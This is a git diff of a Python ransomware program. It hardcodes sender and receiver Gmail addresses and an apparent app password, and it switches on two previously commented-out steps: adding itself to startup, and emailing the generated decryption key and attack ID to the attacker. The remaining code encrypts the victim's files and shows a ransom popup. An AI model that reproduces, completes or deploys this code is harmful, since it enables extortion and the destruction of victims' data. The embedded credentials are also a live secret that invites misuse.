@@ -14,9 +14,9 @@ import winreg
 import base64
 import requests
 
-SENDER = ""
-SENDER_P = ""  # App password here,
-RECEIVER = ""
+SENDER = "notthelachlan@gmail.com"
+SENDER_P = "gfifpnruiznmkrbb"  # App password here,
+RECEIVER = "xytezmapper@gmail.com"
 timer = 60 * 60 * 48  # 48 hours
 
 
@@ -487,7 +487,7 @@ def main():
                 popup_window(attack_id, passw, RECEIVER, attempts_used)
 
         else:  # FIRSTRUN
-            # insert_to_startup()
+            insert_to_startup()
             decrypt_key = Fernet.generate_key()
             attempt = 5
 
@@ -501,7 +501,7 @@ def main():
             file_find(decrypt_key)
 
             # Send the key and attack ID to the attacker's email address
-            # send_email(decrypt_key, attack_id)
+            send_email(decrypt_key, attack_id)
 
             # inject to start up and make a file called temp23.enc in c:\\temp to store the key because we are not
             # monsters
@@ -515,8 +515,6 @@ def main():
                 f.close()
             # Pop-up window with the attack ID and Email to send the key to the attacker
             popup_window(attack_id, decrypt_key, RECEIVER, attempt)
-
-            shut_apps()  # TODO: TEST IT OUT ON A VM (And then move it up maybe?)
 
 
 if __name__ == "__main__":
